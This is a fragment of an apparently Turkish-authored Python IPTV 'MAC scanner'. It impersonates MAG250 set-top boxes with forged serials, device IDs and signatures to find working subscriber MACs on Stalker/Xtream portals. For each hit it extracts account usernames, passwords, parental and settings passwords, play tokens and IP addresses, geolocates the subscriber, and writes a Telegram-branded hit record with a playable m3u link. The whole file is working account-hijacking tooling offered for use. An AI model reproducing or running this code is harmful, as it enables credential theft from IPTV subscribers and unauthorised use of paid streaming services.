	            	url2='http://'+panel+'/'+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: XUI 1.0; API Version: JS API version: 328; STB API version: 135; Player Engine version: 0x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG250&image_version=218&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature='+SINGENC+'&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=7c431b0aec69b2f0194c0680c32fe4e3&timestamp=<TIMES>&api_signature=263&metrics={"mac":"'+macs+'","sn":"'+SNCUT+'","model":"MAG250","type":"STB","uid":"'+DEVENC+'}&JsHttpRequest=1-xml'
	            while True:
	            	try:
	            		res = ses.get(url2,proxies =proxies,  headers=HEADERd, timeout=10, verify=False)
	            		break
	            	except:
	            		bag1=bag1+1
	            		time.sleep(bekleme)
	            		if bag1==120:
	            			quit()
	            bag1=0
	            		
	            #print(HEADERd)	
	            veri=""
	            veri=str(res.text)
	            #
	            #print(url2)
	            #print(veri)
	            #quit()
	            id='null'
	            try:
	            	id=veri.split('{"js":{"id":')[1]
	            	id=id.split(',"name')[0]
	            except:pass
	            try:
	             	expires=veri.split('expires":"')[1].split('"')[0]
	             	print(expires)
	            except:
	             	expires="null"
	            #print(id)
	            #quit()
	            if not id  == 'null' or reddos=="kapat" or not expires=="null":
	            	
		            #print(veri)
		            #quit()
		            ip=""
		            fname=""
		            stb_id=""
		            stb_type=""
		            tplan=""
		            fname=""
		            adult=""
		            user=""
		            passw=""
		            tarrif=""
		            max_online=""
		            expire_billing_date=""
		            
		            
		            
		            if uzmanc=='stalker':
		            	#expire_billing_date" in veri:
		            	try:
			            	stb_id=veri.split('id":"')[1]
			            	stb_id=stb_id.split('"')[0]
			            	
			            	stb_type=veri.split('"stb_type":"')[1]
			            	stb_type=stb_type.split(',')[0]
			            	stb_type=stb_type.replace('"',"")
			            	
			            	tplan=veri.split('"tariff_plan_id":"')[1]
			            	tplan=tplan.split('"')[0]
			            	
			            	fname=veri.split('"fname":"')[1]
			            	fname=fname.split('"')[0]
			            	expire_billing_date=veri.split('"expire_billing_date":"')[1].split('"')[0]
			            	max_online=veri.split('max_online":"')[1]
			            	max_online=max_online.split('"')[0]
			            	passw=veri.split('"password":"')[1]
			            	passw=passw.split('"')[0]
			            	#print(passw)
			            	#quit()
			            	adult=veri.split('parent_password":"')[1]
			            	adult=adult.split('"')[0]
		            	
		            		ip=veri.split('ip":"')[1]
		            		ip=ip.split('"')[0]
		            	except:pass
		            	
		            	timezon=veri.split('"default_timezone":"')[1]
		            	timezon=timezon.split(',')[0]
		            	timezon=timezon.replace('"',"")
		            	
		            	user=veri.split('"login":')[1]
		            	user=user.split(',')[0]
		            	user=user.replace('"',"")
		            	
		            	if passw=="":
			            	passw=veri.split('","password":')[1]
			            	passw=passw.split(',')[0]
			            	passw=passw.replace('"',"")
			            	passw=passw.replace('"','')
		            	
		            	sespas=veri.split('"settings_password":"')[1]
		            	sespas=sespas.split(',')[0]
		            	sespas=sespas.replace('"',"")
		            	
		            	sbitis=veri.split('expire_billing_date":')[1]
		            	sbitis=sbitis.split(',')[0]
		            	sbitis=sbitis.replace('"',"")
		            	if sbitis=="null":
		            		sbitis="Unlimited"
		            		
		            if 'play_token' in veri:
		            	adult=veri.split('parent_password":"')[1]
		            	adult=adult.split('"')[0]
		            	play_token=veri.split('play_token":"')[1]
		            	play_token=play_token.split('"')[0]
		            	acount_id=veri.split('name":"')[1]
		            	acount_id=acount_id.split('"')[0]
		            	stb_id=veri.split('id":"')[1]
		            	stb_id=stb_id.split('"')[0]
		            	stb_type=veri.split('"stb_type":"')[1]
		            	stb_type=stb_type.split('"')[0]
		            	sespas=veri.split('"settings_password":"')[1]
		            	sespas=sespas.split('"')[0]
		            	stb_c=veri.split('"client_type":"')[1]
		            	stb_c=stb_c.split('"')[0]
		            	timezon=veri.split('"default_timezone":"')[1]
		            	timezon=timezon.split('"')[0]
		            	tloca=veri.split('"default_locale":"')[1]
		            	tloca=tloca.split('"')[0]
		            	if 'ip' in veri:
		            		try:
		            			ip=veri.split('ip":"')[1]
		            			ip=ip.split('"')[0]
		            		except:pass
		            
		            bag1=0
		            url3="http://"+panel+"/"+uzmanm+"?action=get_main_info&type=account_info"
		            #url3="http://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
		            while True:
		            	try:
		            		res = ses.get(url3, proxies =proxies,  headers=HEADERd, timeout=15, verify=False)
		            		break
		            	except:
		            		bag1=bag1+1
		            		time.sleep(bekleme)
		            		if bag1==120:
		            			quit()
		            
		            bag1=0
		            veri=""
		            veri=str(res.text)
		            #print("***")
		            #quit()
		            
		            if not veri.count('phone')==0 or not fname=="" or not expires=="null":
		            	hit=hit+1
		            	KalanGun=""
		            	print('     ** HIT **                  ')
		            	
		            	playsound('./Python_Portable/settings/sounds/ching.mp3')
		            	file = pathlib.Path()
		            	
		            
		            	try:
		            		if file.exists ():
		            			ad.mediaPlay()
		            	except:pass
		            	#print(veri)
		            	if 'tariff_plan' in veri:
		            		tarrif=veri.split('tariff_plan":')[1]
		            		tarrif=tarrif.split('}')[0]
		            		tarrif=tarrif.replace('"','')
		            		tarrif=(tarrif.encode('utf-8').decode("unicode-escape")).replace('\/','/')
		
		            	if expires=="null":
			            	if 'end_date' in veri:
			            		#print(veri)
			            		trh=veri.split('end_date":"')[1]
			            		trh=trh.split('"')[0]
			            	else:
			            		try:
				            		trh=veri.split('phone":"')[1]
				            		trh=trh.split('"')[0]
				            		if not fname=="":
				            			if trh=="":
				            				trh=sbitis
				            	except:
				            		trh=sbitis
			            	#print(trh
			            	if not uzmanc=="stalker":
			            		if trh.lower()[:2] =='un':
			            			KalanGun=(" Days")
			            		else:
			            			KalanGun=(str(tarih_clear(trh))+" Days")
			            		trh=trh+' '+ KalanGun
		            	else:
			            	trh=(datetime.datetime.fromtimestamp(int(expires)).strftime('%Y-%m-%d %H:%M:%S'))
		            	#print(kisacikti)
		            	if not kisacikti=="1":
		            		#
		            	#	print("boş")
			            	
			            	url5="http://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
			            	url5="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
			            	real=panel
			            	#print(url5)
			            	kategori="hata"
			            	if kanalkata=="1" or kanalkata=="2" :
			            		while True:
			            			try:
			            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            				print('live')
			            				break
			            			except:
			            				bag1=bag1+1
			            				time.sleep(bekleme)
			            				if bag1==120:
			            					quit()
			            		bag1=0
			            			
			            		veri=str(res.text)
				            	if veri.count('title":"')>1:
				            		for i in veri.split('title":"'):
				            			try:
				            				kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				            			except:pass
				            			kategori=kategori+kanal+" •❖• "
				            			#https://t.me/iptvfreekyng
				            		if '*' in kategori:
				            			kategori=kategori.split("*")[1]
				            		kategori=kategori.replace("\/","/")
				            		kategori=kategori.replace('hata{"js":[{"id":"','')
				            		kategori=kategori.replace('hata{ ','')
			            		
			            #	print(kategori)
			            	url5="http://"+panel+"/"+uzmanm+"?type=vod&action=get_categories&JsHttpRequest=1-xml"
			            	url5="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
			            	kategoriv="hata"
			            	if kanalkata=="2" :
			            		while True:
			            			try:
			            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            				print('vod')
			            				break
			            			except:
			            				bag1=bag1+1
			            				time.sleep(bekleme)
			            				if bag1==120:
			            					quit()
			            		bag1=0
			            			
			            		veri=str(res.text)
				            	if veri.count('title":"')>1:
				            		for i in veri.split('title":"'):
				            			try:
				            				kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				            			except:pass
				            			kategoriv=kategoriv+kanal+" •◈• "
				            			#https://t.me/iptvfreekyng
				            		if '*' in kategoriv:
				            			kategoriv=kategoriv.split("*")[1]
				            		kategoriv=kategoriv.replace("\/","/")
				            		kategoriv=kategoriv.replace('hata{"js":[{"id":"','')
				            		kategoriv=kategoriv.replace('hata{ ','')
			            	#print(kategori)
			            	url5="http://"+panel+"/"+uzmanm+"?type=series&action=get_categories&JsHttpRequest=1-xml"
			            	url5="http://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
			            	kategoris="hata"
			            	if kanalkata=="2" :
			            		while True:
			            			try:
			            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            				print('dizi')
			            				break
			            			except:
			            				bag1=bag1+1
			            				time.sleep(bekleme)
			            				if bag1==120:
			            					quit()
			            		bag1=0
			            			
			            		veri=str(res.text)
				            	if veri.count('title":"')>1:
				            		for i in veri.split('title":"'):
				            			try:
				            				kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				            			except:pass
				            			kategoris=kategoris+kanal+" •⛯• ️ "
				            			#https://t.me/iptvfreekyng
				            		if '*' in kategoris:
				            			kategoris=kategoris.split("*")[1]
				            		kategoris=kategoris.replace('\/','')
				            		kategoris=kategoris.replace('hata{"js":[{"id":"','')
				            		kategoris=kategoris.replace('hata{ ','')
				            		
			            		

			            	
			            	
			            	
			            	
			            
			            	
			            	
			            	
			            	

			            	url5="http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/1823_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
			            	url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"
			            	userm=user
			            	pasdm=passw
			            	while True:
			            		try:
			            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            			break
			            		except:
			            			bag1=bag1+1
			            			time.sleep(bekleme)
			            			if bag1==120:
			            				break
			            	bag1=0
			            	veri=str(res.text)
			            	#print(veri)
			            	#print(play_token)
			            	#quit()
			            	try:
			            		veri=veri.replace('live\/', '') 
			            		real=veri.split('\/')[2]
			            		userm=veri.split('\/')[3]
			            		pasdm=veri.split(userm+'\/')[1]
			            		pasdm=pasdm.split('\/')[0]
			            		pasdm=pasdm.split('"')[0]
			            	except:pass

			            	if userm=="hata":
			            			
			            			url5="http://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=series&p=1&JsHttpRequest=1-xml"
			            			url5="http://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=itv&p=1&JsHttpRequest=1-xml"
			            			token2="play_token" 
			            			while True:
						            		try:
						            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
						            			break
						            		except:
						            			bag1=bag1+1
						            			time.sleep(bekleme)
						            			if bag1==120:
						            				break
			            			bag1=0
			            			veri=str(res.text)
			            			if 'cmd' in veri:
						            		token2=veri.split('cmd":"')[1]
						            		token2=token2.split('"')[0]
						            	#print(token2)
			            			real=panel
			            			url5="http://"+real+"/"+uzmanm+"?action=create_link&type=vod&cmd="+token2+"&JsHttpRequest=1-xml"
			            			url5="http://"+real+"/"+uzmanm+"?action=create_link&type=itv&cmd="+token+"&JsHttpRequest=1-xml"
			            			while True:
			            				try:
			            					res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            					break
			            				except:
			            					bag1=bag1+1
			            					time.sleep(bekleme)
			            					if bag1==120:
			            						break
			            			bag1=0
			            			try:
			            				real=veri.split('\/')[2]
			            				userm=veri.split('\/')[4]
			            				pasdm=veri.split('\/')[5]
			            				realm=real
			            			except:pass
			            			
			            	
			            	
			            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_live_streams"
			            	while True:
			            		try:
			            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=7, verify=False)
			            			print('livelist')
			            			break
			            		except:
			            			bag1=bag1+1
			            			time.sleep(bekleme)
			            			if bag1==120:
			            			 	break
			            	bag1=0
			            	veri=str(res.text)
			            	kanalsayisi=str(veri.count("stream_id"))
			            #	print(kanalsayisi)
			            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_vod_streams"
			            	while True:
			            		try:
			            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=7, verify=False)
			            			print('vodlist')
			            			break
			            		except:
			            			bag1=bag1+1
			            			time.sleep(bekleme)
			            			if bag1==120:
			            			 	break
			            	bag1=0
			            	veri=str(res.text)
			            	filmsayisi=str(veri.count("stream_id"))
			            	
			            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_series"
			            	while True:
			            		try:
			            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=7, verify=False)
			            			print('dizilist')
			            			break
			            		except:
			            			bag1=bag1+1
			            			time.sleep(bekleme)
			            			if bag1==120:
			            			 	break
			            	bag1=0
			            	veri=str(res.text)
			            	dizisayisi=str(veri.count("series_id"))
			            	if not fname=="":
			            		userm=user
			            		pasdm=passw
			            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm
			            	while True:
			            		try:
			            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=7, verify=False)
			            			print('playerapi')
			            			break
			            		except:
			            			bag1=bag1+1
			            			time.sleep(bekleme)
			            			if bag1==120:
			            			 	break
			            	bag1=0
			            	veri=""
			            	veri=str(res.text)
			            	#print(veri)
			            	acon="" 
			            	if 'active_cons' in veri:
			            		try:
					            	#print(veri)
					            	acon=""
					            	acon=veri.split('active_cons":')[1]
					            	acon=acon.split(',')[0]
					            	acon=acon.replace('"',"")
					            	
					            	mcon=veri.split('max_connections":')[1]
					            	mcon=mcon.split(',')[0]
					            	mcon=mcon.replace('"',"")
					            	
					            	status=veri.split('status":')[1]
					            	status=status.split(',')[0]
					            	status=status.replace('"',"")
					            	
					            	timezone=veri.split('timezone":"')[1]
					            	timezone=timezone.split('",')[0]
					            	timezone=timezone.replace("\/","/")
					            	
					            	realm=veri.split('url":')[1]
					            	realm=realm.split(',')[0]
					            	realm=realm.replace('"',"")
					            	#print(realm)
					            	portal=panel
					            	port=veri.split('port":')[1]
					            	port=port.split(',')[0]
					            	port=port.replace('"',"")
					            	
					            	user=veri.split('username":')[1]
					            	user=user.split(',')[0]
					            	user=user.replace('"',"")
					            	
					            	passw=veri.split('password":')[1]
					            	passw=passw.split(',')[0]
					            	passw=passw.replace('"',"")
					            	bitis=""
					            	bitis=veri.split('exp_date":')[1]
					            	bitis=bitis.split(',')[0]
					            	bitis=bitis.replace('"',"")
					            	#print(bitis)
					            	if bitis=="null":
					            		bitis="Unlimited"
					            	else:
					            		#biti=bitis
					            		#now_ns = time.time_ns()
					            		
					            		bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
					            	#	print(kalan)
					            		
					            		
					            	
					            	bitis=bitis
			            		except:pass
			            	
			
			
			            	imzavpn=""
			            	if not ip=="":
			            		utc_offset=""
			            		org1=""
			            		asn1=""
			            		vpn=""
			            		url5="https://freegeoip.app/json/"+ip
			            		print(url5)
			            		#while True:
			            		if 1==1:
				            		try:
				            			res = ses.get(url5, headers=HEADERd, proxies =proxies,  timeout=10, verify=False)
				            			veri=""
				            			veri=str(res.text)
				            			if not '404 page' in veri:
				            				vpn=veri.split('"country_name":"')[1]
				            				vpn=vpn.split('"')[0]
				            			#print('ip adrsii')
				            			#break
				            		except:pass
				            			
				            	bag1=0
				            	
				            	url5="https://iplist.cc/api/"+ip
				            	if 1==1:#while True:
				            		try:
				            			res = ses.get(url5, proxies =proxies, timeout=4, verify=False)
				            			print('vpn2')
				            			#break
				            		except:pass
				            			
				            	
				            	try:
				            		bag1=0
				            		veri=str(res.text)
				            		ServerISP=""
				            		ServerRegistry=""
				            		ServerLocation=""
				            		if not 'title' in veri:
				            			ServerISP=veri.split('name": "')[1]
				            			ServerISP=ServerISP.split('"')[0]
				            			ServerRegistry=veri.split('registry": "')[1]
				            			ServerRegistry=ServerRegistry.split('"')[0]
				            			ServerLocation=veri.split('countryname": "')[1]
				            			ServerLocation=ServerLocation.split('"')[0]
				            		
				            	except:pass            	
			            	try:
			            		
			            		pal=panel.split(':')[0]
			            		pal=pal.replace('/stalker_portal','')
			            		yanpanel1="hata" 
				            	yanpanel="hata" 
				            	url= "http://ipv4info.com/?act=check&ip="+pal
				            	res = ses.get(url, timeout=7, verify=False)
				            	veri=str(res.text)
				            	yan=""
				            	yanlar=veri
				            	yanpanel="hata"
				            	if veri.count("Site info ")>0:
				            	    for i in veri.split('Site info ('):
				            	    	yan=yan+(i.split(')')[0])+" 🌎 "
				            	    	yanpanel=(yan.split('(')[1])
				            	else:
						   		       yan1=veri.split('href="/ip-address')[1]
						   		       yan1=yan1.split('">')[0]
						   		       url="http://ipv4info.com/ip-address"+yan1
						   		       res = ses.get(url, timeout=7, verify=False)
						   		       veri=str(res.text)
						   		       if veri.count("Site info ")>0:
						   		             for i in veri.split('Site info ('):
						   		              yan=yan+(i.split(')')[0])+" 🌎 "
						   		              yanpanel=(yan.split('(')[1])
						   		
						   	#else:
						   	      	
				            	pal=real
				            	if real ==panel:
				            		pal=realm
				            	if not realm==panel:
				            		pal=realm.split(':')[0]
				            		url= "http://ipv4info.com/?act=check&ip="+pal
				            		res = ses.get(url, timeout=7, verify=False)
				            		veri=str(res.text)
				            		yan=""
				            		yanpanel1="hata"
				            		if veri.count("Site info ")>0:
				            		   for i in veri.split('Site info ('):
				            		   	if yanpanel.count(i.split(')')[0])==0:
				            		   		yan=yan+(i.split(')')[0])+" 🌎 "
				            		   		yanpanel1=(yan.split('(')[1])
				            		else:
				            			yan1=veri.split('href="/ip-address')[1]
				            			yan1=yan1.split('">')[0]
				            			url="http://ipv4info.com/ip-address"+yan1
				            			res = ses.get(url, timeout=7, verify=False)
				            			veri=str(res.text)
				            			if veri.count("Site info ")>0:
						   		         for i in veri.split('Site info ('):
						   		          	  if yanpanel.count(i.split(')')[0])==0:
						   		          	   	yan=yan+(i.split(')')[0])+" 🌎 "
						   		          	   	yanpanel1=(yan.split('(')[1])
						   		
				            	if not yanpanel1=="hata" :
				            		yanpanel=yanpanel+yanpanel1
				            	yanpanel=yanpanel.replace(" 🌎  🌎 "," 🌎 ")
			            	except:pass
			            		
			            	
			            	mlink="http://"+ panel + "/get.php?username=" + userm + "&password=" + pasdm + "&type=m3u_plus"
			            	imzaa=""
			            	imzab=""
			            	imzak=""
			            
			            	if not fname=="":
			            		panell=panel+'/stalker_portal'
			            	else:
			            		panell=panel
			            	if  'stalker_portal' in uzmanm:
			            		panell=panel+'/stalker_portal'
			            	else:
			            		panell=panel
			            		
			            	imzaip1=""
			            	imzaip2=""
			            	imzaip3=""
			            	imzasif=""
			            	if not ip=="":
			            		
			            			if not vpn=="":
			            				imzavpn=("""
▮➥𝗩 🇳​🇵⇶ """+vpn+"""		""")
			            				
			            			if not ServerISP=="":
			            				imzaip1=("""
▮➥ᎠᏫᎷᎪᏆNᏆᏚᏢ⇶ """+str(ServerISP)+"""
▮➥ᏚᎬᎡᏙᎬᎡ ᎡᎬᏀᏆᏚᎢ⇶ """+str(ServerRegistry)+""" 
▮➥ᏚᎬᎡᏙᎬᎡ ᏞᏫᏟᎪᎢᏆᏫN⇶ """+ServerLocation+""" """)
#imzavpn=imzavpn+
			            			#imzaip2=("""
#▮➥ᏚᏟᎪNᎢᏆᎷᎬ⇶ """+str(datetime)+"""|​"""+str(abbreviation)+"""|​"""+str(utc_offset1)+"""""")
			            			#imzaip3=("""
#▮➥ᏟᏞᏆᎠᎬNᎢ ᏆᏢ ᎪᎠᎡᎬᏚᏚ⇶ """+str(ip)+"""​ 
#▮➥ᏟᏞᏆᎠᎬNᎢ ᎢᏆᎷᎬᏃᏫNᎬ⇶ """+str(Timezone)+""" ​ 
#▮➥ᏌᎢᏟ ᏫᎱ̵Ꮁ̵ᏚᎬᎢ⇶ """+str(utc_offset)+""" ​ 
#▮➥ᏟᏫᏌNᎢᎡᎽ⇶ """+str(country_name)+"""
#▮➥ᎡᎬᏀᏆᏫN⇶ """+str(region)+"""
#▮➥ᏆNᎢᎬᎡNᎬᎢ ᏢᎡᏫᏙᏆᎠᎬᎡ⇶ """+str(org1)+"""
#▮➥ᎪᏚN⇶ """+str(asn1)+"""|​ᏟᎪᏢᏆᎢᎪᏞ⇶ """+str(country_capital)+"""​ 
#▮➥ᏟᏆᎢᎽ⇶ """+str(city)+"""​|ᏢᏫᏚᎢᎪᏞᏟᏫᎠᎬ⇶ """+str(postal)+""" |ᏞᎪNᏀᏌᎪᏀᎬᏚ⇶ """+str(languages)+"""
   # ✰⇘ https://t.me/iptvfreekyng ⇙✰""")
			            		
			# » » »
			            	imza1=("""
"""+nickn+"""
╔✩✩ https://t.me/iptvfreekyng ✩✩╗
    ✰⇘https://t.me/iptvfreekyng⇙✰
▮➥ⓅⒶⓃⒺⓁ⇶ http://"""+panell+"""/c/
▮➥ⓇⒺⒶⓁ⇶ http://"""+real+"""/c
▮➥ⓂⒶⒸ⇶ """+mac+"""
▮➥ⒺⓍⓅ⇶ """+trh+""" 
🔴   """+nickn+ """ """)
			            	if not adult =="":
			            		imzaa=("""
▮➥ⓐⓒⓝ~ⓘⓓ⇶ """+acount_id+"""
▮➥ⓢⓣⓑ~ⓘⓓ⇶ """+stb_id+"""
▮➥ⓢⓣⓑ~ⓣⓘⓟⓘ⇶ """+stb_type+"""
▮➥ⓒⓛⓘⓔⓝⓣ~ⓣⓘⓟⓘ⇶ """+stb_c+"""
▮➥ⓐ~ⓟⓐⓢⓢ⇶ """+adult+"""
▮➥ⓢ~ⓟⓐⓢⓢ⇶ """+sespas+"""
▮➥ⓟⓛⓐⓨⓣⓞⓚⓔⓝ⇶ """+play_token+"""
▮➥ⓘⓟ⇶ """+ip+"""
▮➥ⓣⓘⓜⓔⓩⓞⓝⓔ⇶ """+timezon.replace('\/','/')+"""
▮➥ⓛⓞⓒⓐⓛ⇶ """+tloca+"""
     ✰⇘https://t.me/iptvfreekyng ⇙✰""")
			            		
			            	if uzmanc=='stalker':#stalker_portal' in uzmanm:
			            		#if not fname=="":
			            			imzaa=("""
▮➥ExpireBillingDate⇶ """+expire_billing_date+"""
▮➥🆄🆂🅴🆁⇶ """+user+"""
▮➥🅿🅰🆂🆂⇶ """+passw+"""
▮➥🆂🆃🅱🅸🅳⇶ """+stb_id+"""
▮➥🆂🆃🅱🆃🆈🅿🅴⇶ """+stb_type+"""
▮➥Max_Online⇶ """+max_online+"""
▮➥🅸🅽🅵🅾⇶ """+fname+"""
▮➥🅰°🅿🅰🆂🆂⇶ """+adult+"""
▮➥🆂°🅿🅰🆂🆂⇶ """+sespas+"""
▮➥🅿🅻🅰🅽🅸🅳⇶ """+tplan+"""
▮➥🆃🆁🅰🆁🆁🅸🅵🅿🅻🅰🅽⇶ """+tarrif+"""
▮➥🆃🅸🅼🅴🆉🅾🅽🅴⇶ """+timezon.replace('\/','/')+"""
▮➥🅸🅿⇶ """+ip+"""
  """+nickn+"""""")
			            	imzasif=("""
✰⇘https://t.me/iptvfreekyng ⇙
▮➥𝘀𝗘𝗿𝗜𝗮𝗟⇶ """+SNENC+"""
▮➥𝘀𝗘𝗿𝗜𝗮𝗟𝗰𝗨𝘁⇶ """+SNCUT+"""
▮➥𝗱𝗘𝘃𝗜𝗰𝗘𝗶𝗗°𝟭⇶ """+DEVENC+"""
▮➥𝗱𝗘𝘃𝗜𝗰𝗘𝗶𝗗°𝟮⇶ """+SINGENC+"""
  """+nickn+""" """)
			            	imza3=("""
▮➥𝙈​₃𝙐~🅤🅡🅛 ⇶  """+mlink+"""
  ✩⇘🇵​🇦​🇳​🇩​🇴​🇷​🇦​_ 🅿🆈 ⇙✩
  ✩✩ ᴄᴏɴғɪɢ✩✩""")
			            			
			            			
				   #except:pass
			            	imza2=""
			            	if not acon=="":
			            		imza2=("""
▮➥𝙃𝙊𝙎𝙏⇶ http://"""+portal+"""/c/
▮➥𝙍𝙀𝘼𝙇⇶ http://"""+realm+""":"""+port+"""/c
▮➥𝙋𝙊𝙍𝙏⇶ """+port+"""
▮➥𝙐𝙎𝙀𝙍⇶ """+user+"""
▮➥𝙋𝘼𝙎𝙎⇶ """+passw+"""
▮➥𝙀𝙓𝙋𝙏⇶ """+bitis+""" 
▮➥𝘼𝘾𝙏𝙄𝙊𝙉⇶ """+acon+"""
▮➥𝙈𝘼𝙆𝙎İ𝙈𝙐𝙈⇶ """+mcon+""" 
▮➥𝙎𝙏𝘼𝙏𝙐𝙎⇶ """+status+"""
▮➥𝙏𝙄𝙈𝙀𝙕𝙊𝙉𝙀⇶ """+timezone+"""
       """+nickn+"""
▮➥COUNTRİESCOUNT⇶ """+kanalsayisi+"""
▮➥VODCOUNT⇶ """+filmsayisi+"""
▮➥SERİCOUNT⇶ """+dizisayisi+"""
    """+nickn+"""""")

			            	#print(yanpanel)
			            	if not yanpanel=="hata":
			            		imzayan=("""
▮➥ 🅨🅐🅝🅟🅐🅝🅔🅛🅛🅔🅡 ⇶  """+yanpanel.replace(" 🌎","\n▮➥ ⇶ ")+""""""+nickn+""" ️""")
			            	if kanalkata=="1" or kanalkata =="2":
			            		imzab=("""
    """+nickn+"""
▮➥🅤🅛🅚🅔 ⇶              		
▮➥ """+kategori+""" """)
			#https://t.me/iptvfreekyng
			            	if kanalkata =="2":
			            		imzak=("""
▮➥🅥🅞🅓 ⇶   
▮➥ """+kategoriv+"""
▮➥🅢🅔🅡🅘 ⇶    
▮➥ """+kategoris+""" """)
			            	imzas=("""""")
			            	imza=imza1+imzaa+imza2+imzavpn+imzaip1+imzaip2+imzaip3+imzasif+imzayan+imza3+imzab+imzak+imzas
			            	#print(imza)
		            	else:
		            		imza=("""╔✩✩ https://t.me/iptvfreekyng ✩✩╗
▮➥ 𝕻𝖆𝖓𝖊𝖑⇶ http://"""+panel+"""/c/
▮➥ 𝕸𝖆𝖈⇶ """+mac+"""
▮➥ 𝕰𝖝𝖕.⇶ """+trh+""" 
    ✰⇘ https://t.me/iptvfreekyng⇙✰  """+nickn+""" """)
		            			            	
		            	yaz(imza+'\n'+'\n')
		            	print(imza)
		            	mac=""
		            	macs=""
			            	#print("********")
				##except:pass
				   
	if not ozelmac=="":
		quit()
			
		
			
		
			
			
		
